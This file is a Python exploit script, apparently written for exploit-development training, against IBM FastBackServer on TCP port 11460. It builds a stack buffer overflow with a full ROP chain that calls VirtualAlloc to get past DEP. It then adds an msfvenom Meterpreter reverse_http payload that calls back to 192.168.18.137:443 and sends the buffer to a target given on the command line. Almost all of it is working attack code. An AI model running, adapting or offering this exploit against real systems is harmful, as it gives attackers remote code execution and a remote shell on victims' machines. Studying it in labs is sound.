"""
===============================================================
======================= - Breakpoints - =======================
===============================================================
        bp wsock32!recv
        bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6
        bp FastBackServer!FX_AGENT_Cyclic+0xD0
        bp FastBackServer!FXCLI_OraBR_Exec_Command
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac
        bp FastBackServer!FXCLI_SetConfFileChunk+0x40
===============================================================
================= - Packet/Buffer Structure - =================
===============================================================
        0x00       : Checksum DWORD
        0x04 - 0x34: psAgentCommand
                    - 0x04 - 0xC:  ??
                    - 0x10:         Opcde
                    - 0x14:         Offset for copy operation
                    - 0x18:         Size of copy operation
                    - 0x1C:         Offset for 2nd copy operation
                    - 0x20:         Size of 2nd copy operation
                    - 0x24:         Offset for 3rd copy operation
                    - 0x28:         Size of 3rd copy operation
                    - 0x2C - 0x34: ??
        0x34 - End:  psCommandBuffer

# # Checksum
# buf = pack(">i", 0x2330)

# # psAgentCommand
# buf += bytearray([0x41] * 0x10)
# buf += pack("<i", 0x0)                # 1st memcpy: offset
# buf += pack("<i", 0x1000)             # 1st memcpy: size
# buf += pack("<i", 0x0)                # 2nd memcpy: offset
# buf += pack("<i", 0x1000)             # 2nd memcpy: size
# buf += pack("<i", -0x11000)           # 3rd memcpy: offset
# buf += pack("<i", 0x13000)            # 3rd memcpy: size
# buf += bytearray([0x41] * 0x8)

# # psCommandBuffer
# buf += bytearray([0x45] * 0x100)      # 1st Buffer
# buf += bytearray([0x45] * 0x200)      # 2nd Buffer
# buf += bytearray([0x45] * 0x2000)     # 3rd Buffer
===============================================================

Used MSF-PATTERN_CREATE, found eip at offset 276
                         found esp at offset 280

BAD_CHARS = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]
"""

import socket
import sys
from struct import pack

from colorama import Fore, Style, init
from numpy import byte

from modules.msfvenom_module import generatePayload

init()

# Checksum
buf = bytearray()  # Checksum DWORD        0x00 - 0x04

# psAgentCommand
buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
buf += pack("<i", 0x534)  # Opcode                0x10
buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
buf += pack("<i", 0x500)  # 1st memcpy: size      0x18
buf += pack("<i", 0x0)  # 2nd memcpy: offset    0x1C
buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
buf += pack("<i", 0x0)  # 3rd memcpy: offset    0x24
buf += pack("<i", 0x100)  # 3rd memcpy: size      0x28
buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34


# psCommandBuffer

VirtualAlloc = pack("<L", (0x45454545))  # Dummy VirtualAlloc Addr
VirtualAlloc += pack("<L", (0x46464646))  # Dummy VirtualAlloc Ret
VirtualAlloc += pack("<L", (0x47474747))  # Dummy Shellcode Addr
VirtualAlloc += pack("<L", (0x48484848))  # Dummy dwSize
VirtualAlloc += pack("<L", (0x49494949))  # Dummy flAllocationType
VirtualAlloc += pack("<L", (0x51515151))  # Dummy flProtect

offset = b"A" * (276 - len(VirtualAlloc))
eip = pack("<L", (0x50501110))  # CSFTPAV6.dll -> PUSH ESP; PUSH EAX; POP EDI; POP ESI; RET | This got me into the stack for exec

# NOTE:: POP requires the value to loaded in  the next 4 bytes to work
# For example, to load ECX with -1
# 0xFFFFFFFF must be the next value right after our POP ECX instruction as the POP instruction increments ESI by 4

# VirtualAlloc(lpVoid lpAddress, size_t dwSize, dword flAllocationType, dword flProtect)
# lpAddress = shellcode addr
# dwSize = 0x1
# flAllocationType = 0x1000 (MEM_COMMIT)
# flProtect = 0x40 (PAGE_EXECUTE_READWRITE)

# ROP Chain to write VirtualAlloc IAT address into ESI
rop = pack("<L", (0x5050118E))  #             MOV EAX, ESI; POP ESI; RETN | Store VirtualAlloc IAT(VA_IAT) into EAX
rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
rop += pack("<L", (0x505115A3))  #      -> POP ECX, RET; | Load offset into ECX
rop += pack("<L", (0xFFFFFFE4))  # -0x1c | Load ECX with -28
rop += pack("<L", (0x5051579A))  #      -> ADD EAX, ECX; RET | Adjust EAX by subtracting ECX
rop += pack("<L", (0x50537D5B))  #      -> PUSH EAX; POP ESI; RET | Store VirtualAlloc IAT into ESI
rop += pack("<L", (0x5053A0F5))  #      -> POP EAX; RET | Prepare to load VA_IAT + 1
rop += pack("<L", (0x5054A221))  #      -> VirtualAlloc IAT + 1 | Store Manually incremented VA_IAT on stack
rop += pack("<L", (0x505115A3))  #      -> POP ECX; RET | Load -1 into ECX
rop += pack("<L", (0xFFFFFFFF))  #      -> mov -1 into ecx | Store -1 on stack for prevInstrcution
rop += pack("<L", (0x5051579A))  #      -> ADD EAX, ECX; RET | Add -1 to EAX, gets true VA_IAT
rop += pack("<L", (0x5051F278))  #      -> MOV EAX, dw [EAX]; RET | store dereferenced VA_IAT (VirtualAlloc Addr) into EAX
rop += pack("<L", (0x5051CBB6))  #      -> MOV dw [ESI], EAX; RET | store VirtualAlloc Addr into ESI (overwrite IAT)

# writing return address for VirtualAlloc
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x5050118E))  #      -> MOV EAX, ESI ; POP ESI ; RET | Save ESI in EAX, then POP stack into ESI
rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
rop += pack("<L", (0x5052F773))  #      -> PUSH EAX; POP ESI; RET | Stock into EAX, pop next 4 bytes into ESI
rop += pack("<L", (0x505115A3))  #      -> POP ECX; RET | Load -0x210 into ECX
rop += pack("<L", (0xFFFFFDF0))  # -0x210 | Load ECX with -0x210
rop += pack("<L", (0x50533BF4))  #      -> SUB EAX, ECX; RET | Small dummy positive offset to EAX, will point to shellcode
rop += pack("<L", (0x5051CBB6))  #      -> MOV dw [ESI], EAX; RET | overwrite dummy shellcode with real shellcode address

# fetching & writing lpAddress (shellcode addr) to ESI
# bp 0x5051CBB6
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118E))  # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242))  # junk
rop += pack("<L", (0x5052F773))  # push eax ; pop esi ; ret
rop += pack("<L", (0x505115A3))  # pop ecx ; ret
rop += pack("<L", (0xFFFFFDF4))  # -0x20c
rop += pack("<L", (0x50533BF4))  # sub eax, ecx ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret

# fetching & writing dwSize (0x1) to ESI
# bp 0x5051CBB6
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
rop += pack("<L", (0xFFFFFFFF))  # -1 value that is negated
rop += pack("<L", (0x50527840))  # neg eax ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret

# fetching & writing flAllocationType (0x1000) to ESI
# bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
rop += pack("<L", (0x80808080))  # first value to be added
rop += pack("<L", (0x505115A3))  # pop ecx ; ret
rop += pack("<L", (0x7F7F8F80))  # second value to be added
rop += pack("<L", (0x5051579A))  # add eax, ecx ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret

# fetching & writing flProtect (0x40) to ESI
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
rop += pack("<L", (0x80808080))  # first value to be added
rop += pack("<L", (0x505115A3))  # pop ecx ; ret
rop += pack("<L", (0x7F7F7FC0))  # second value to be added
rop += pack("<L", (0x5051579A))  # add eax, ecx ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret
# rop += pack("<L", (0x5051E4DB))  # int3 ; push eax ; call esi

# Align stack for VirtualAlloc Exec
# bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
rop += pack("<L", (0x5050118E))  # mov eax, esi; pop esi; ret
rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
rop += pack("<L", (0x505115A3))  # pop ecx; ret
rop += pack("<L", (0xFFFFFFE8))  # -0x18 | Load ECX with -0x18
rop += pack("<L", (0x5051579A))  # add eax, ecx; ret | Adjust EAX to point to start of shellcode
rop += pack("<L", (0x5051571F))  # xchg eax, ebp; ret | Set EBP to point to start of shellcode, which will be used as stack for VirtualAlloc
rop += pack("<L", (0x50533CBF))  # mov esp, ebp; pop ebp; ret | Set ESP to point to start of shellcode, prepare for VirtualAlloc call

# Calculated padding to align with return address
padding = b"C" * 0xE0

# increased from 0x400 to 0x600 when using msfvenom
shellcode = generatePayload(payload="windows/meterpreter/reverse_http", LHOST="192.168.18.137", LPORT=443, bad_chars="\x00\x09\x0a\x0b\x0c\x0d\x20")

buffer = offset + VirtualAlloc + eip + rop + padding + shellcode

buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04


def printBuffer(buf, width="db"):
    if width == "db":
        w = 1
        groups_per_line = 16
    elif width == "dw":
        w = 2
        groups_per_line = 8
    elif width == "dd":
        w = 4
        groups_per_line = 4
    else:
        print(f"ERR: Invalid width {width}")
        exit(-1)
    bytes_per_line = groups_per_line * w
    for i in range(0, len(buf), bytes_per_line):
        print(
            Fore.YELLOW + f"\t" + f"{i:04x} - {min(i+bytes_per_line, len(buf)):04x}: " + Style.RESET_ALL,
            end="",
        )
        for g in range(groups_per_line):
            start = i + g * w
            if start >= len(buf):
                break
            if width == "db":
                for j in range(w):
                    if start + j < len(buf):
                        print(f"{buf[start+j]:02x}", end=" ")
                    else:
                        print("  ", end="")
            else:
                val = 0
                for j in range(w):
                    if start + j < len(buf):
                        val |= buf[start + j] << (8 * (w - 1 - j))
                if width == "dw":
                    print(f"{val:04x}", end=" ")
                elif width == "dd":
                    print(f"{val:08x}", end=" ")
        print()


def main():
    if len(sys.argv) != 2:
        print(f"ERR: No ip addr provided")
        exit(-1)

    server = sys.argv[1]
    port = 11460

    print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))

        print(Fore.CYAN + f"o Sending Buffer ({len(buf)} bytes): " + Style.RESET_ALL)
        printBuffer(buf, width="dd")
        s.send(buf)
        s.close()

        sys.exit(0)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
        sys.exit(1)


if __name__ == "__main__":
    main()
